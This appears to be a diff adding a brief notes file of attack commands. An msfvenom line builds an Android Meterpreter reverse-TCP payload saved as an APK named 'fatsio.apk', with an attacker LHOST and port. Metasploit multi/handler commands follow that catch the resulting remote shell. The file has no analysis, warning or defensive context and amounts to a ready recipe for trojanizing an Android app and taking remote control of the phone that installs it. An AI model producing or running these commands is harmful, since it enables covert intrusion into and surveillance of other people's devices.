@@ -1,0 +1,12 @@
+# ###################### 
+# [+] COMMENDS : 
+###################### 
+Payload 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.32 LPORT=2342 R > /root/Desktop/fatsio.apk 
+
+metasploit 
+use exploit/multi/handler 
+set PAYLOAD android/meterpreter/reverse_tcp 
+set LHOST 192.168.1.32 
+set LPORT 2342 
+exploit 
